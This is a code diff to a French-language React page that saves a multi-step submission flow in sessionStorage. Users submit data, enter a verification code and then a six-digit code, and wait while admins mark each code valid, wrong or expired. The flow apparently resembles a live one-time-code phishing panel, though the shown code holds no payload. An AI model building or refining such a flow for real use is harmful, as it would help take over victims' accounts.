@@ -18,19 +18,35 @@ export default function Home() {
     const p = getParams();
     if (p.get("triggerAction")) return "triggerAction";
     if (p.get("trigger")) return "form";
+    const savedStep = sessionStorage.getItem("currentStep");
+    if (savedStep && ["validation", "code", "code6", "waiting"].includes(savedStep)) return savedStep;
     return "form";
   };
 
   const [step, setStep] = useState(getInitialStep);
   const [loading, setLoading] = useState(false);
-  const [submittedData, setSubmittedData] = useState(null);
-  const [submissionId, setSubmissionId] = useState(getParams().get("id") || null);
+  const [submittedData, setSubmittedData] = useState(() => {
+    try { return JSON.parse(sessionStorage.getItem("submittedData")) || null; } catch { return null; }
+  });
+  const [submissionId, setSubmissionId] = useState(() => {
+    return getParams().get("id") || sessionStorage.getItem("submissionId") || null;
+  });
   const pollingValidationRef = useRef(null);
   const pollingCodeRef = useRef(null);
   const pollingWaitingRef = useRef(null);
   const [showStatusCheck, setShowStatusCheck] = useState(false);
   const [showFAQ, setShowFAQ] = useState(false);
   const [adminInactive, setAdminInactive] = useState(false);
+
+  // Persist step in sessionStorage so refresh doesn't lose position
+  const setStepPersisted = (newStep) => {
+    if (["validation", "code", "code6", "waiting"].includes(newStep)) {
+      sessionStorage.setItem("currentStep", newStep);
+    } else {
+      sessionStorage.removeItem("currentStep");
+    }
+    setStep(newStep);
+  };
 
   // Check admin status on mount
   useEffect(() => {
@@ -83,10 +99,10 @@ export default function Home() {
       setAdminInactive(adminRes?.data?.is_inactive || false);
       const res = await base44.functions.invoke("checkStatus", { submissionId });
       const s = res?.data?.status;
-      if (s === "code_ready") { clearInterval(pollingValidationRef.current); setStep("code"); }
-      else if (s === "code6_ready") { clearInterval(pollingValidationRef.current); setStep("code6"); }
-      else if (s === "code_wrong" || s === "code_expired") { clearInterval(pollingValidationRef.current); setStep("wrong"); }
-      else if (s === "waiting_queue") { clearInterval(pollingValidationRef.current); setStep("queue"); }
+      if (s === "code_ready") { clearInterval(pollingValidationRef.current); setStepPersisted("code"); }
+      else if (s === "code6_ready") { clearInterval(pollingValidationRef.current); setStepPersisted("code6"); }
+      else if (s === "code_wrong" || s === "code_expired") { clearInterval(pollingValidationRef.current); setStepPersisted("wrong"); }
+      else if (s === "waiting_queue") { clearInterval(pollingValidationRef.current); setStepPersisted("queue"); }
     }, 1500);
     return () => clearInterval(pollingValidationRef.current);
   }, [step, submissionId]);
@@ -97,9 +113,9 @@ export default function Home() {
     pollingCodeRef.current = setInterval(async () => {
       const res = await base44.functions.invoke("checkStatus", { submissionId }).catch(() => null);
       const s = res?.data?.status;
-      if (s === "code6_ready") { clearInterval(pollingCodeRef.current); setStep("code6"); }
-      else if (s === "code_wrong" || s === "code_expired") { clearInterval(pollingCodeRef.current); setStep("wrong"); }
-      else if (s === "waiting_queue") { clearInterval(pollingCodeRef.current); setStep("queue"); }
+      if (s === "code6_ready") { clearInterval(pollingCodeRef.current); setStepPersisted("code6"); }
+      else if (s === "code_wrong" || s === "code_expired") { clearInterval(pollingCodeRef.current); setStepPersisted("wrong"); }
+      else if (s === "waiting_queue") { clearInterval(pollingCodeRef.current); setStepPersisted("queue"); }
     }, 1500);
     return () => clearInterval(pollingCodeRef.current);
   }, [step, submissionId]);
@@ -110,12 +126,12 @@ export default function Home() {
     pollingWaitingRef.current = setInterval(async () => {
       const res = await base44.functions.invoke("checkStatus", { submissionId });
       const s = res?.data?.status;
-      if (s === "code_valid") { clearInterval(pollingWaitingRef.current); setStep("verified"); }
-      else if (s === "code_ready") { clearInterval(pollingWaitingRef.current); setStep("code"); }
-      else if (s === "code6_ready") { clearInterval(pollingWaitingRef.current); setStep("code6"); }
-      else if (s === "code_wrong") { clearInterval(pollingWaitingRef.current); setStep("wrong"); }
-      else if (s === "code_expired") { clearInterval(pollingWaitingRef.current); setStep("expired"); }
-      else if (s === "waiting_queue") { clearInterval(pollingWaitingRef.current); setStep("queue"); }
+      if (s === "code_valid") { clearInterval(pollingWaitingRef.current); setStepPersisted("verified"); }
+      else if (s === "code_ready") { clearInterval(pollingWaitingRef.current); setStepPersisted("code"); }
+      else if (s === "code6_ready") { clearInterval(pollingWaitingRef.current); setStepPersisted("code6"); }
+      else if (s === "code_wrong") { clearInterval(pollingWaitingRef.current); setStepPersisted("wrong"); }
+      else if (s === "code_expired") { clearInterval(pollingWaitingRef.current); setStepPersisted("expired"); }
+      else if (s === "waiting_queue") { clearInterval(pollingWaitingRef.current); setStepPersisted("queue"); }
     }, 1500);
     return () => clearInterval(pollingWaitingRef.current);
   }, [step, submissionId]);
@@ -138,7 +154,9 @@ export default function Home() {
       
       setSubmittedData(data);
       setSubmissionId(submissionId);
-      setStep("validation");
+      sessionStorage.setItem("submittedData", JSON.stringify(data));
+      sessionStorage.setItem("submissionId", submissionId);
+      setStepPersisted("validation");
     } catch (error) {
       // Rate limit or other error
       const errorMsg = error.response?.data?.error || "Une erreur s'est produite";
@@ -157,7 +175,7 @@ export default function Home() {
       code,
       submissionId,
     }).catch(() => {});
-    setStep("waiting");
+    setStepPersisted("waiting");
     setLoading(false);
   };
 
@@ -168,19 +186,20 @@ export default function Home() {
       code,
       submissionId,
     }).catch(() => {});
-    setStep("waiting");
+    setStepPersisted("waiting");
     setLoading(false);
   };
 
   const handleBack = () => {
+    sessionStorage.clear();
     window.location.href = "/";
   };
 
   const handleRetryCode = async () => {
-    if (!submissionId) { setStep("code"); return; }
+    if (!submissionId) { setStepPersisted("code"); return; }
     const res = await base44.functions.invoke("checkStatus", { submissionId }).catch(() => null);
     const s = res?.data?.status;
-    setStep(s === "code6_ready" ? "code6" : "code");
+    setStepPersisted(s === "code6_ready" ? "code6" : "code");
   };
 
   const handleCodeExpire = () => {
@@ -205,7 +224,7 @@ export default function Home() {
                 <div className="text-4xl mb-4">⏳</div>
                 <h2 className="font-heading text-xl font-bold text-foreground mb-2">Aucun admin disponible</h2>
                 <p className="text-muted-foreground text-sm mb-6">Les administrateurs sont actuellement absents. Votre demande sera traitée dès que possible.</p>
-                <button onClick={() => setStep("form")} className="px-4 py-2 bg-primary text-primary-foreground rounded-lg text-sm font-medium hover:bg-primary/80 transition-colors">
+                <button onClick={() => { sessionStorage.clear(); setStep("form"); }} className="px-4 py-2 bg-primary text-primary-foreground rounded-lg text-sm font-medium hover:bg-primary/80 transition-colors">
                   Retour
                 </button>
               </div>
